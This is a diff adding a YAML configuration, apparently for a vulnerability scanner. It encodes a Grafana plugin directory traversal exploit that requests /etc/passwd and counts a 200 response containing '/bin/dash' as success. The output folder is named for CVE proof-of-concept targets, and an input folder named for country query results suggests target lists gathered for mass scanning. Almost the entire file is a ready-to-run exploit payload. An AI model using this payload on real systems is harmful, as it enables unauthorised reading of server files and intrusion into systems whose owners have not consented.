@@ -1,0 +1,17 @@
+targetPath: /public/plugins/graph/../../../../../../../../etc/passwd
+targetMethod: get
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:8080
+    https: 127.0.0.1:8080
+targetAllowRedirects: false
+targetHeaders:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: /bin/dash
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/grafana目录遍历/
+targetRestText: True
